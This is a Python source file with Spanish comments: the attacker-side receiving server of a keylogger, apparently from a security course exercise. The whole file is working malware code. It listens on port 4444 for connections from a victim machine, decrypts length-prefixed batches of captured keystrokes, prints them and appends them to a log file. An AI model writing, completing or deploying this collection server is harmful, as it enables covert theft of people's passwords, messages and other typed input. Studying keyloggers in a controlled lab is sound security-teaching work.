# servidor_atacante.py — corre en la máquina atacante
"""
Servidor TCP receptor en la máquina atacante.

Escucha conexiones entrantes, recibe cada mensaje con su
prefijo de longitud, descifra y muestra las teclas capturadas.

Los datos recibidos se almacenan en 'capturado.txt' para
análisis posterior (requisito del Ejercicio 2).

Uso:
    python servidor_atacante.py
"""

import json
import socket
import struct
from datetime import datetime
from cifrado import decrypt

# ── Configuración ──────────────────────────────────────────────────────────────
LISTEN_HOST = "0.0.0.0"   # escucha en todas las interfaces
LISTEN_PORT = 4444
OUTPUT_FILE = "capturado.txt"


def recvall(sock: socket.socket, n: int) -> bytes:
    """
    Lee exactamente n bytes del socket.

    TCP puede fragmentar los datos — recv() puede devolver
    menos bytes de los pedidos. Este helper loop garantiza
    que se lean exactamente n bytes antes de continuar.

    Parámetros:
        sock (socket.socket): conexión activa
        n    (int)          : bytes a leer

    Retorna:
        bytes: exactamente n bytes, o lanza ConnectionError si
               la conexión se cerró antes.
    """
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Conexión cerrada inesperadamente")
        data += chunk
    return data


def handle_connection(conn: socket.socket, addr: tuple) -> None:
    """
    Maneja una conexión entrante de la víctima.

    Lee el prefijo de 4 bytes para saber el tamaño del mensaje,
    luego lee exactamente ese número de bytes, descifra y muestra.

    Parámetros:
        conn (socket.socket): socket de la conexión aceptada
        addr (tuple)        : (ip, puerto) del cliente
    """
    with conn:
        print(f"\n[+] Conexión desde {addr[0]}:{addr[1]}")
        try:
            # 1. Leer los 4 bytes del prefijo de longitud
            raw_len = recvall(conn, 4)
            msg_len = struct.unpack(">I", raw_len)[0]

            # 2. Leer exactamente msg_len bytes
            data = recvall(conn, msg_len)

            # 3. Descifrar — lanza InvalidTag si fue alterado (MITM)
            plaintext = decrypt(data)

            # 4. Deserializar y mostrar
            batch = json.loads(plaintext.decode("utf-8"))
            print(f"[+] {len(batch)} teclas recibidas:")
            for ts, key in batch:
                print(f"    {ts}  {key}")

            # 5. Guardar para análisis posterior (requisito Ej. 2)
            with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
                for ts, key in batch:
                    f.write(f"{ts}\t{key}\n")

        except Exception as e:
            print(f"[!] Error procesando conexión: {e}")


def main() -> None:
    """
    Bucle principal del servidor. Acepta conexiones indefinidamente.
    Cada conexión se maneja de forma síncrona (una a la vez),
    suficiente para el entorno controlado del proyecto.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((LISTEN_HOST, LISTEN_PORT))
        server.listen(5)
        print(f"[*] Escuchando en {LISTEN_HOST}:{LISTEN_PORT}")
        print(f"[*] Guardando en '{OUTPUT_FILE}'")

        while True:
            conn, addr = server.accept()
            handle_connection(conn, addr)


if __name__ == "__main__":
    main()